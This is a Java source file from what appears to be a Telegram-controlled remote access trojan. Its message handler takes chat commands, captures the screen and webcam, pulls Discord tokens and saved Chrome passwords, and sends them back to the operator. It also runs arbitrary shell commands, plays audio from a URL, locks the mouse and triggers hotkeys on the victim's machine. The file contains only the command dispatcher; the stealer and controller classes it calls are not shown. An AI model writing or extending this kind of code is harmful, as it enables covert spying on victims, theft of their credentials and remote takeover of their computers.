package org.example.messageController;

import marvin.video.MarvinVideoInterfaceException;
import org.example.systemController.*;
import org.example.third_party.DiscordToken;
import org.example.Bot;
import org.example.third_party.Passwords;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;

import java.util.Objects;

public class MessageHandler {

    AddMessage sendMessage = new AddMessage();
    ScreenController screenController = new ScreenController();

    CameraController cameraController = new CameraController();
    BrowserController browserController = new BrowserController();

    AudioController audioController = new AudioController();

    CMDController cmdController = new CMDController();

    HotKey hotKey = new HotKey();
    Buttons buttons = new Buttons();

    Boolean audio = false;

    Boolean cmd = false;

    Boolean mouse = true;

    public void init()
    {
        hotKey.mouseLock();
    }

    public void check(Update update, Bot bot)
    {
        String mesasge = update.getMessage().getText();
        Long chatId = update.getMessage().getChatId();

        if(Objects.equals(mesasge, "/start"))
        {
            audio = false;
            buttons.first(bot, chatId, "Hi, are you linux user? \uD83D\uDE0F");
            return;
        }

        if(Objects.equals(mesasge, "Cancel"))
        {
            audio = false;
            cmd = false;

            buttons.first(bot, chatId, "Ok");
            return;
        }

        if (audio)
        {
            audio = false;

            try {
                audioController.play(mesasge);
                buttons.first(bot, chatId, "Sound enabled");
            } catch (Exception e) {
                sendMessage.text(bot, chatId, "Failed");
            }
            return;
        }

        if (cmd)
        {
            cmd = false;

            try {
                cmdController.execute(mesasge);
                buttons.first(bot, chatId, "Executed");
            } catch (Exception e) {
                sendMessage.text(bot, chatId, e.toString());
            }
            return;
        }

        switch (mesasge)
        {

            case "Screenshot \uD83D\uDDBC\uFE0F":
                try {
                    InputFile image = screenController.screenshot();
                    sendMessage.image(bot, chatId, image);
                } catch (Exception e) {
                    sendMessage.text(bot, chatId, "Failed");
                }
                break;

            case "Discord \uD83E\uDD21\uFE0F":

                try {
                    String tokens = new DiscordToken().getTokens();
                    sendMessage.text(bot, chatId, tokens);
                } catch (Exception e) {
                    sendMessage.text(bot, chatId, "Failed");
                }

                break;

            case "Camera \uD83D\uDCF8\uFE0F":

                try {
                    InputFile camera = cameraController.capture();
                    sendMessage.image(bot, chatId, camera);
                } catch (Exception e) {
                    sendMessage.text(bot, chatId, "Failed");
                }

                break;

            case "Passwords":

                try {
                    String passwords = new Passwords().chrome();
                    sendMessage.bigText(bot, chatId, passwords);
                } catch (Exception e) {
                    sendMessage.text(bot, chatId, "Failed");
                }
                break;

            case "PlayAudio":
                buttons.cancel(bot, chatId, "Please send url to sound");

                audio = true;

                break;

            case "Hotkeys":
                buttons.hotkeys(bot, chatId, "Select hotkey");

                break;

            case "CMD":
                buttons.cancel(bot, chatId, "Please send command to execute");

                cmd = true;

                break;

            //Hotkeys

            case "LinkedIn":
                try {
                    hotKey.linkedin();
                    sendMessage.text(bot, chatId, "Ok");
                } catch (Exception e) {
                    sendMessage.text(bot, chatId, "Failed");
                }
                break;

            case "CloseApp":
                try {
                    hotKey.f4();
                    sendMessage.text(bot, chatId, "Ok");
                } catch (Exception e) {
                    sendMessage.text(bot, chatId, "Failed");
                }
                break;

            case "MouseLock":
                try {
                    mouse = !mouse;

                    hotKey.mouseStatus(mouse);
                    sendMessage.text(bot, chatId, "Mouse status: " + mouse.toString());
                } catch (Exception e) {
                    sendMessage.text(bot, chatId, "Failed");
                }
                break;

            default:
                sendMessage.text(bot, chatId, "Sorry, but command undefined");
                break;
        }
    }
}
